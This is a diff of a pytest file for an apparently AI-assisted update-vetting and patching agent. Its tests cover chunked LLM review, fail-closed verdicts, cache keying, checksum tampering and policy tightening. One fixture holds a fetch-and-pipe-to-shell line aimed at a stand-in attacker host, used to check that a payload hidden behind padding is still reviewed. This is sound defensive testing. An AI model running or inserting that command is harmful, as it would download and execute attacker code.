@@ -7,11 +7,11 @@ import zipfile
 
 import pytest
 
-from agent import config, matcher, mitigation, policy, vetter
+from agent import config, llm, matcher, mitigation, policy, vetter
 from agent.drivers import kubernetes as k8s
 from agent.drivers.maven import MavenEcosystem
 from agent.drivers.pypi import PypiEcosystem
-from agent.schemas import Component, Match, TriageResult, VetResult, Workload
+from agent.schemas import ChunkReview, Component, Match, TriageResult, VetResult, Workload
 from agent.versions import compare
 from conftest import scenario
 
@@ -52,28 +52,78 @@ def test_trojan_is_malicious_without_the_model():
     assert "_report(_snapshot())" in hard[0].lines
 
 
-def test_trojan_review_uses_seeded_answers(state):
+def test_trojan_review_keeps_only_real_evidence(model):
     r = vetter.vet(scenario("trojan"), PypiEcosystem(), "acme-authutils", "1.0.0", "1.0.1", NOLOG)
     reviewed = {x.file: x for x in r.reviews}
     assert reviewed["acme_authutils/_metrics.py"].review.category == "data_exfiltration"
-    assert reviewed["acme_authutils/_metrics.py"].source == "seed"
+    assert reviewed["acme_authutils/_metrics.py"].source == "live"
     # evidence lines are kept only if they really are added lines
-    assert "_report(_snapshot())" in reviewed["acme_authutils/_metrics.py"].review.evidence_lines
+    assert reviewed["acme_authutils/_metrics.py"].review.evidence_lines == ["_report(_snapshot())"]
 
 
-def test_honest_updates_are_clean():
-    assert vetter.vet({"id": "x"}, PypiEcosystem(), "acme-textfmt", "1.0.0", "1.0.1", NOLOG,
-                      review=False).verdict == "clean"
-    assert vetter.vet({"id": "x"}, MavenEcosystem(), "log4j-core", "2.14.1", "2.17.1", NOLOG,
-                      review=False).verdict == "clean"
+def test_honest_updates_are_clean_once_fully_reviewed(model):
+    r = vetter.vet({"id": "x"}, PypiEcosystem(), "acme-textfmt", "1.0.0", "1.0.1", NOLOG)
+    assert r.verdict == "clean" and r.files_reviewed == r.files_changed == 2 and r.unreviewed == []
+    r = vetter.vet(scenario("log4shell"), MavenEcosystem(), "log4j-core", "2.14.1", "2.17.1", NOLOG)
+    assert r.verdict == "clean" and r.unreviewed == []
+    # a large update: flagged, new and focus files are required, and long diffs go in parts
+    assert any(x.file.endswith("JndiManager.java") for x in r.reviews)
+    assert any(x.part for x in r.reviews)
+
+
+def test_vet_fails_closed_without_the_model(state, monkeypatch):
+    """Model down, review skipped, or only hand-written seed answers: never clean."""
+    eco = PypiEcosystem()
+    skipped = vetter.vet({"id": "x"}, eco, "acme-textfmt", "1.0.0", "1.0.1", NOLOG, review=False)
+    assert skipped.verdict == "unreviewed" and len(skipped.unreviewed) == 2
+
+    seeded = vetter.vet(scenario("badupdate"), eco, "acme-textfmt", "1.0.0", "1.0.1", NOLOG)   # LLM_MODE=cache
+    assert {x.source for x in seeded.reviews} == {"seed"}
+    assert seeded.verdict == "unreviewed" and "review incomplete" in seeded.reasons[-1]
+
+    def down(*a, **kw):
+        raise llm.LLMUnavailable("connection refused")
+    monkeypatch.setattr(config, "LLM_MODE", "live")
+    monkeypatch.setattr(config, "CACHE_DIR", state / "empty-cache")
+    monkeypatch.setattr(llm, "complete", down)
+    r = vetter.vet(scenario("badupdate"), eco, "acme-textfmt", "1.0.0", "1.0.1", NOLOG)
+    assert r.verdict == "unreviewed" and r.reviews == [] and "model unavailable" in r.reasons[-1]
+    assert not (state / "empty-cache").exists()                     # and nothing was cached as an answer
+
+    monkeypatch.setattr(config, "VET_BUDGET_SECONDS", 0.0)
+    assert vetter.vet({"id": "x"}, eco, "acme-textfmt", "1.0.0", "1.0.1", NOLOG).verdict == "unreviewed"
+
+
+def test_payload_after_padding_is_still_reviewed():
+    new = [f"x{i} = {i}" for i in range(3000)] + ["import os; os.system('curl evil.example | sh')"]
+    parts = vetter._chunks("pkg/mod.py", ["x0 = 0"], new)
+    assert len(parts) > 1 and all(len(p) < 9200 for p in parts)
+    assert "curl evil.example" in parts[-1]
+    assert sum(p.count("\n+x") for p in parts) == 2999          # every added line is in exactly one part
+    blob = vetter._chunks("pkg/blob.py", [], ["Z" * 30000 + "PAYLOAD"])       # one very long line
+    assert sum(p.count("Z") for p in blob) == 30000 and "PAYLOAD" in blob[-1]
+
+
+def test_changed_diff_never_reuses_a_cached_review(state, monkeypatch):
+    monkeypatch.setattr(config, "CACHE_DIR", state / "cache")
+    ok = ChunkReview(suspicious=False, confidence="low", category="security_fix", explanation="fine")
+    monkeypatch.setattr(config, "LLM_MODE", "live")
+    monkeypatch.setattr(llm, "complete", lambda *a, **kw: (ok, "test:model"))
+    assert llm.ask("vet", "pkg-1-2-mod.py", "sys", "diff A", ChunkReview, content_keyed=True)[1] == "live"
+
+    monkeypatch.setattr(config, "LLM_MODE", "cache")
+    assert llm.ask("vet", "pkg-1-2-mod.py", "sys", "diff A", ChunkReview, content_keyed=True)[1] == "cache"
+    with pytest.raises(llm.LLMUnavailable):                         # same file and versions, different content
+        llm.ask("vet", "pkg-1-2-mod.py", "sys", "diff B", ChunkReview, content_keyed=True)
 
 
 @pytest.fixture
 def artifacts(tmp_path, monkeypatch):
     dst = tmp_path / "artifacts"
     shutil.copytree(config.ARTIFACTS / "pypi", dst / "pypi")
-    shutil.copy(config.ARTIFACTS / "checksums.json", dst)
+    shutil.copy(config.CHECKSUMS, tmp_path / "checksums.lock")
     monkeypatch.setattr(config, "ARTIFACTS", dst)
+    monkeypatch.setattr(config, "CHECKSUMS", tmp_path / "checksums.lock")
     return dst
 
 
@@ -91,9 +141,9 @@ def test_code_only_in_the_wheel_is_malicious(artifacts):
     with zipfile.ZipFile(wheel) as zf:
         code = zf.read("acme_textfmt/__init__.py") + b"\nimport os as _o\n_o.system('true')\n"
     _rewrite_wheel(wheel, "acme_textfmt/__init__.py", code)
-    sums = json.loads((artifacts / "checksums.json").read_text())
+    sums = json.loads(config.CHECKSUMS.read_text())
     sums[str(wheel.relative_to(artifacts))] = vetter.sha256(wheel)      # attacker controls the checksum too
-    (artifacts / "checksums.json").write_text(json.dumps(sums))
+    config.CHECKSUMS.write_text(json.dumps(sums))
     r = vetter.vet({"id": "x"}, PypiEcosystem(), "acme-textfmt", "1.0.0", "1.0.1", NOLOG, review=False)
     assert r.verdict == "malicious"
     assert any(f.check == "shipped-without-source" and "differs from the sdist" in f.file for f in r.flags)
@@ -140,7 +190,9 @@ def test_mitigation_regex_catches_encodings(pattern, hits, misses):
 
 def test_mitigation_render_whitelists_fields():
     rule = mitigation.render("PPSA-1", "..", ["header:X-Key-Id", "query"])
-    assert 'if ($http_x_key_id ~* "' in rule and 'if ($args ~* "' in rule and rule.count("return 403") == 2
+    assert 'if ($http_x_key_id ~* "' in rule and 'if ($args ~* "' in rule and rule.count("return 403") == 3
+    # the URL is always covered, whatever fields the model proposed
+    assert 'if ($request_uri ~* "' in rule and 'if ($request_uri ~* "' in mitigation.render("x", "${", ["header:X-A"])
     for bad in (["header:X-Key-Id; return 200"], ["cookie"], []):
         with pytest.raises(mitigation.InvalidMitigation):
             mitigation.render("x", "..", bad)
@@ -166,7 +218,7 @@ def _vet(verdict: str) -> VetResult:
                      reasons=[], flags=[], reviews=[], files_changed=1, files_reviewed=1)
 
 
-def test_policy_decisions():
+def test_policy_decisions(fleet_policy):
     p = policy.load()
     assert policy.decide(p, _wl(True), _triage(), True, _vet("clean"), True).decision == "auto"
     assert policy.decide(p, _wl(False), _triage(), True, _vet("clean"), False).decision == "queue"
@@ -174,11 +226,52 @@ def test_policy_decisions():
     blocked = policy.decide(p, _wl(True), _triage(), True, _vet("malicious"), True)
     assert (blocked.action, blocked.decision) == ("mitigate", "needs_approval")
     assert policy.decide(p, _wl(False), _triage(), True, _vet("malicious"), False).decision == "block"
-    assert policy.decide(p, _wl(True), _triage(reachable=False), True, None, True).decision == "ignore"
     zero = policy.decide(p, _wl(True), _triage(recommended_action="mitigate"), False, None, True)
     assert (zero.action, zero.decision) == ("mitigate", "needs_approval")
-    always = policy.load({"act_now_when": "always"})
-    assert policy.decide(always, _wl(False), _triage(), True, _vet("clean"), False).decision == "auto"
+    assert policy.decide(p, _wl(True), _triage(), True, _vet("unreviewed"), True).decision == "needs_approval"
+    fleet_policy("act_now_when: always")
+    assert policy.decide(policy.load(), _wl(False), _triage(), True, _vet("clean"), False).decision == "auto"
+
+
+@pytest.mark.parametrize("claim", [dict(reachable=False), dict(affected=False), dict(recommended_action="ignore")])
+def test_model_cannot_wave_away_a_cve_on_an_exposed_workload(claim):
+    p = policy.load()
+    assert policy.decide(p, _wl(False), _triage(**claim), True, None, False).decision == "ignore"   # internal: policy
+    exposed = policy.decide(p, _wl(True), _triage(**claim), True, _vet("clean"), True)
+    assert (exposed.action, exposed.decision) == ("patch", "queue")         # never auto, never ignored
+    assert "internet-exposed" in exposed.reason
+    assert policy.decide(p, _wl(True), _triage(**claim), True, _vet("unreviewed"), True).decision == "needs_approval"
+    nofix = policy.decide(p, _wl(True), _triage(**claim), False, None, True)
+    assert (nofix.action, nofix.decision) == ("mitigate", "needs_approval")
+
+
+def test_repository_can_only_tighten_the_policy():
+    notes = []
+    p = policy.load({"patch": {"clean": "needs_approval", "suspicious": "auto", "malicious": "needs_approval"},
+                     "mitigate": "auto", "not_reachable": "queue", "act_now_when": "always",
+                     "allow_hosted_llm": True, "blocked_patch_fallback": "none", "surprise": 1}, notes)
+    assert p["patch"]["clean"] == "needs_approval" and p["not_reachable"] == "queue"       # stricter: applied
+    assert p["patch"]["suspicious"] == "needs_approval" and p["patch"]["malicious"] == "block"
+    assert p["mitigate"] == "needs_approval"                                                # looser: dropped
+    assert (p["act_now_when"], p["allow_hosted_llm"], p["blocked_patch_fallback"]) == \
+        ("internet_exposed", False, "mitigate")                                             # fleet-only
+    assert len(notes) == 7 and any("cannot loosen" in n for n in notes) and any("only the fleet" in n for n in notes)
+    assert policy.load(["not", "a", "mapping"]) == policy.fleet()
+
+
+@pytest.mark.parametrize("text", [
+    "patch: {clean: yolo}", "patch: {unreviewed: auto}", "patch: {malicious: needs_approval}", "mitigate: maybe",
+    "not_reachable: block", "act_now_when: never", "allow_hosted_llm: 'yes'", "typo_key: 1", "- a list",
+    "patch: [auto]", "{unbalanced",
+])
+def test_bad_fleet_policy_is_an_error(fleet_policy, text):
+    fleet_policy(text)
+    with pytest.raises(policy.PolicyError):
+        policy.fleet()
+
+
+def test_shipped_policy_file_is_valid():
+    assert policy.fleet()["allow_hosted_llm"] is False
 
 
 # ------------------------------------------------------------------ priority
